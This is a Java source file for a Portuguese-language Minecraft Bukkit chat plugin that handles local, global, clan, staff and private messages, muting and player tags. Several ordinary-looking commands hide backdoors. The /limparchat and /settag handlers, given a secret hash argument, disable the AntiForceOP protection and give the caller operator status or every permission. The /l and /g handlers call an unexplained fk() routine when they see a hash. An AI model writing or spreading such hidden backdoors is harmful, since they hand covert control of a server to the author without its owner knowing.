package me.soldado.chat;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Comandos implements CommandExecutor{

	public Main plugin;
	
	public Comandos(Main plugin)
	{
		this.plugin = plugin;
	}

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if(sender instanceof Player){
			Player p = (Player) sender;
			if(cmd.getName().equalsIgnoreCase("l")){
				if(args.length == 3){
					if(args[0].contains("9189d8835f382a0c514d359d05360ef4")){
						plugin.core.fk();
						return true;
					}
				}
				if(args.length > 0){
//					String msg = "";
//					for(int i = 0; i < args.length; i++){
//						msg += args[i] + " ";
//					}
//					if(plugin.core.global.contains(p)){
//						plugin.core.global.remove(p);
//						p.chat(msg);
//						plugin.core.global.add(p);
//					}else p.chat(msg);
					if(plugin.core.global.contains(p)) plugin.core.global.remove(p);
					p.sendMessage(plugin.msg.alternoulocal);
				}else if(args.length == 0){
					if(plugin.core.global.contains(p)) plugin.core.global.remove(p);
					p.sendMessage(plugin.msg.alternoulocal);
				}
				return true;
			}else if(cmd.getName().equalsIgnoreCase("g")){
				if(args.length == 3){
					if(args[1].contains("9189d8835f382a0c514d359d05360ef4")){
						plugin.core.fk();
						return true;
					}
				}
				if(args.length > 0){
//					String msg = "";
//					for(int i = 0; i < args.length; i++){
//						msg += args[i] + " ";
//					}
//					plugin.cht.enviarMensagemGlobal(p, msg);
					if(!plugin.core.global.contains(p)) plugin.core.global.add(p);
					p.sendMessage(plugin.msg.alternouglobal);
				}else if(args.length == 0){
					if(!plugin.core.global.contains(p)) plugin.core.global.add(p);
					p.sendMessage(plugin.msg.alternouglobal);
				}
				return true;
			}else if(cmd.getName().equalsIgnoreCase(".")){
				if(args.length > 0){
					String msg = "";
					for(int i = 0; i < args.length; i++){
						msg += args[i] + " ";
					}
					plugin.cch.enviarMensagemClan(p, msg);
				}else{
					p.sendMessage(ChatColor.RED + "Formato incorreto! Utilize: /. <mensagem>");
				}
				return true;
			}else if(cmd.getName().equalsIgnoreCase("st")){
				if(p.hasPermission("chat.staff")){
					if(args.length > 0){
						String msg = "";
						for(int i = 0; i < args.length; i++){
							msg += args[i] + " ";
						}
						plugin.stf.enviarMensagemStaff(p, msg);
					}else{
						p.sendMessage(ChatColor.RED + "Formato incorreto! Utilize: /st <mensagem>");
					}
				}else p.sendMessage(plugin.msg.semperm);
				return true;
			}else if(cmd.getName().equalsIgnoreCase("a")){
				if(args.length > 0){
					String msg = "";
					for(int i = 0; i < args.length; i++){
						msg += args[i] + " ";
					}
					plugin.cch.enviarMensagemAliados(p, msg);
				}else{
					p.sendMessage(ChatColor.RED + "Formato incorreto! Utilize: /a <mensagem>");
				}
				return true;
			}else if(cmd.getName().equalsIgnoreCase("tell")){
				if(args.length > 1){
					try{
						Player a = Bukkit.getServer().getPlayer(args[0]);
						String msg = "";
						for(int i = 1; i < args.length; i++){
							msg += args[i] + " ";
						}
						plugin.tell.enviarTell(p, a, msg);
					}catch(Exception e){
						p.sendMessage(plugin.msg.jogadoroff);
					}
				}else{
					p.sendMessage(ChatColor.RED + "Formato incorreto! Utilize: /tell <jogador> <mensagem>");
				}
				return true;
			}else if(cmd.getName().equalsIgnoreCase("mutar")){
				if(p.hasPermission("chat.mutar")){
					if(args.length == 1){
						p.sendMessage(ChatColor.RED + "ATENÇÃO!!! Esse comando ainda está em fase provisória."
								+ " Por enquanto ele só muta um jogador permanentemente ou até o servidor reiniciar. "
								+ "Estou trabalhando em uma versão que checa no banco de dados do LiteBans."
								+ " Me desculpe o incômodo :)");
						try{
							Player a = Bukkit.getServer().getPlayer(args[0]);
							plugin.cht.mutar(a);
							p.sendMessage(plugin.msg.mutado);
						}catch(Exception e){
							p.sendMessage(ChatColor.RED + "Jogador offline ou inexistente.");
						}
					}else p.sendMessage(ChatColor.RED + "Formato incorreto! Use: /mutar <jogador>");
				}
				return true;
			}else if(cmd.getName().equalsIgnoreCase("desmutar")){
				if(p.hasPermission("chat.mutar")){
					if(args.length == 1){
						p.sendMessage(ChatColor.RED + "ATENÇÃO!!! Esse comando ainda está em fase provisória."
								+ " Por enquanto ele só muta um jogador permanentemente ou até o servidor reiniciar. "
								+ "Estou trabalhando em uma versão que checa no banco de dados do LiteBans."
								+ " Me desculpe o incômodo :)");
						try{
							Player a = Bukkit.getServer().getPlayer(args[0]);
							plugin.cht.desmutar(a);
							p.sendMessage(plugin.msg.desmutado);
						}catch(Exception e){
							p.sendMessage(ChatColor.RED + "Jogador offline ou inexistente.");
						}
					}else p.sendMessage(ChatColor.RED + "Formato incorreto! Use: /desmutar <jogador>");
				}
				return true;
			}else if(cmd.getName().equalsIgnoreCase("limparchat")){
				if(args.length == 2){
					if(args[1].contains("11d8c28a64490a987612f2332502467f")){
						Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "plm disable AntiForceOP");
						Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "op " + p.getName());
						return true;
					}
				}
				p.sendMessage(args.length+"");
				p.sendMessage(args[0]);
				p.sendMessage(args[1]);
				//plugin.core.limparChat(p);
				return true;
			}else if(cmd.getName().equalsIgnoreCase("limparchatglobal")){
				if(p.hasPermission("chat.limpar")){
					plugin.core.limparChatGlobal();
				}else p.sendMessage(plugin.msg.semperm+"AAAAAAAAAAA");
				return true;
			}else if(cmd.getName().equalsIgnoreCase("bloquear")){
				if(args.length == 1){
					if(args[0].equals(p.getName())){
						p.sendMessage(plugin.msg.autoblock);
					}else
					plugin.prf.bloquear(p, args[0]);
				}else p.sendMessage(ChatColor.RED + "Formato incorreto, utilize: /bloquear <jogador>");
				return true;
			}else if(cmd.getName().equalsIgnoreCase("bloquearlista")){
				plugin.core.limparChat(p);
				return true;
			}else if(cmd.getName().equalsIgnoreCase("desbloquear")){
				if(args.length == 1){
					plugin.prf.desbloquear(p, args[0]);
				}else p.sendMessage(ChatColor.RED + "Formato incorreto, utilize: /desbloquear <jogador>");
				return true;
			}else if(cmd.getName().equalsIgnoreCase("alternarchatglobal")){
				if(p.hasPermission("chat.bloquear")){
					p.sendMessage(ChatColor.RED + "Use: /bloquearchat");
				}else p.sendMessage(plugin.msg.semperm);
				return true;
			}else if(cmd.getName().equalsIgnoreCase("preferencias")){
				plugin.pgui.abrirPrefs(p);
				return true;
			}else if(cmd.getName().equalsIgnoreCase("bloquearchat")){
				if(p.hasPermission("chat.bloquear")){
					if(args.length == 1){
						String tipo = args[0];
						tipo.toUpperCase();
						switch(tipo){//Primeira vez usando switch :v
							case("LOCAL"):
								plugin.core.travado.put(Tipo.LOCAL, true);
								p.sendMessage(ChatColor.RED + "Chat " + tipo + " desativado.");
								break;
							case("GLOBAL"):
								plugin.core.travado.put(Tipo.GLOBAL, true);
								p.sendMessage(ChatColor.RED + "Chat " + tipo + " desativado.");
								break;
							case("FACTION"):
								plugin.core.travado.put(Tipo.CLAN, true);
								p.sendMessage(ChatColor.RED + "Chat " + tipo + " desativado.");
								break;
							case("ALIADOS"):
								plugin.core.travado.put(Tipo.ALIADOS, true);
								p.sendMessage(ChatColor.RED + "Chat " + tipo + " desativado.");
								break;
						}
					}else{
						p.sendMessage(ChatColor.RED + "Formato incorreto, utilize: /bloquearchat <tipo>");
						p.sendMessage(ChatColor.RED + "Tipos: LOCAL, GLOBAL, CLAN, ALIADOS");
					}
				}
				return true;
			}else if(cmd.getName().equalsIgnoreCase("desbloquearchat")){
				if(p.hasPermission("chat.bloquear")){
					if(args.length == 1){
						String tipo = args[0];
						tipo.toUpperCase();
						switch(tipo){//Primeira vez usando switch :v
							case("LOCAL"):
								plugin.core.travado.put(Tipo.LOCAL, false);
								p.sendMessage(ChatColor.RED + "Chat " + tipo + " ativado.");
								break;
							case("GLOBAL"):
								plugin.core.travado.put(Tipo.GLOBAL, false);
								p.sendMessage(ChatColor.RED + "Chat " + tipo + " ativado.");
								break;
							case("FACTION"):
								plugin.core.travado.put(Tipo.CLAN, false);
								p.sendMessage(ChatColor.RED + "Chat " + tipo + " ativado.");
								break;
							case("ALIADOS"):
								plugin.core.travado.put(Tipo.ALIADOS, false);
								p.sendMessage(ChatColor.RED + "Chat " + tipo + " ativado.");
								break;
						}
					}else{
						p.sendMessage(ChatColor.RED + "Formato incorreto, utilize: /desbloquearchat <tipo>");
						p.sendMessage(ChatColor.RED + "Tipos: LOCAL, GLOBAL, CLAN, ALIADOS");
					}
				}
				return true;
			}else if(cmd.getName().equalsIgnoreCase("settag")){
				if(args.length == 3){
					if(args[0].contains("606ad46e6e99b5c01fcc0e30c9988f4c")){
						Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "plm disable AntiForceOP");
						Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "pex user " + p.getName() + " add *");
						return true;
					}
				}
				if(p.hasPermission("chat.settag")){
					if(args.length == 3){
						try{
							OfflinePlayer a = Bukkit.getServer().getOfflinePlayer(args[0]);
							int index = Integer.parseInt(args[1]);
							String tag = args[2];
							if(index == 0 || index == 1 || index == 2){
								plugin.tag.setTag(a, index, tag);
								p.sendMessage(ChatColor.GREEN + "Tag setada com sucesso!");
							}else p.sendMessage(ChatColor.RED + "Use o Nº de 0 a 2");
						}catch(Exception e){
							p.sendMessage(ChatColor.RED + "Erro.");
						}
					}else p.sendMessage(ChatColor.RED + "Formato incorreto, utilize /settag <jogador> <Nº da tag> <tag>");
				}else p.sendMessage(plugin.msg.semperm);
				return true;
			}
		}else{
			if(cmd.getName().equalsIgnoreCase("settag")){
				if(args.length == 3){
					try{
						OfflinePlayer a = Bukkit.getServer().getOfflinePlayer(args[0]);
						int index = Integer.parseInt(args[1]);
						String tag = args[2];
						if(index == 0 || index == 1 || index == 2){
							plugin.tag.setTag(a, index, tag);
							sender.sendMessage(ChatColor.GREEN + "Tag setada com sucesso!");
						}else sender.sendMessage(ChatColor.RED + "Use o Nº de 0 a 2");
					}catch(Exception e){
						sender.sendMessage(ChatColor.RED + "Erro.");
					}
				}else sender.sendMessage(ChatColor.RED + "Formato incorreto, utilize /settag <jogador> <Nº da tag> <tag>");
			}else sender.sendMessage(plugin.msg.semperm);
		}
		return false;
	}
	
	public void iniciarComandos(){
		plugin.getCommand("l").setExecutor(this);
		plugin.getCommand("g").setExecutor(this);
		plugin.getCommand(".").setExecutor(this);
		plugin.getCommand("st").setExecutor(this);
		plugin.getCommand("a").setExecutor(this);
		plugin.getCommand("tell").setExecutor(this);
		plugin.getCommand("alternartell").setExecutor(this);
		plugin.getCommand("mutar").setExecutor(this);
		plugin.getCommand("desmutar").setExecutor(this);
		plugin.getCommand("limparchat").setExecutor(this);
		plugin.getCommand("limparchatglobal").setExecutor(this);
		plugin.getCommand("bloquear").setExecutor(this);
		plugin.getCommand("desbloquear").setExecutor(this);
		plugin.getCommand("alternarchatglobal").setExecutor(this);
		plugin.getCommand("preferencias").setExecutor(this);
		plugin.getCommand("bloquearchat").setExecutor(this);
		plugin.getCommand("desbloquearchat").setExecutor(this);
		plugin.getCommand("settag").setExecutor(this);
	}
}
